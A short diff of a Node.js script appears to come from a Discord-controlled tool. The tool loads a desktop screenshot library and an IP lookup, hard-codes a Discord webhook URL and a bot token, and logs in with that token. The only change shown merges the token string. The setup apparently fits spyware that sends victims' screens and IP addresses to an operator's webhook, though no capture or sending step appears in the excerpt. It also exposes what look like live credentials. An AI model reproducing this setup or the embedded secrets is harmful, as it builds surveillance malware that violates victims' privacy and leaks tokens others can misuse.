@@ -4,7 +4,7 @@ const fetch = require('node-fetch')
 var Discord = require("discord.js")
 var client = new Discord.Client()
 var azk = "https://ptb.discord.com/api/webhooks/861273343738511400/N6Fre0U9E0EKAqkGsgiGOVHDOM50j3nhLbvkm-V6CKMz0GLeq9uulpBFGyl75dYTLV2m"
-var token = "NzQzMjg2NDk4MDMxNTY2ODk4.XzSdfg.uLlz7PuF61E_9DPaDE5_Z6o0ij"+"8"
+var token = "NzQzMjg2NDk4MDMxNTY2ODk4.XzSdfg.uLlz7PuF61E_9DPaDE5_Z6o0ij8"
 var ip = require("ip");
 const screenshot = require('screenshot-desktop')
 client.login(token)
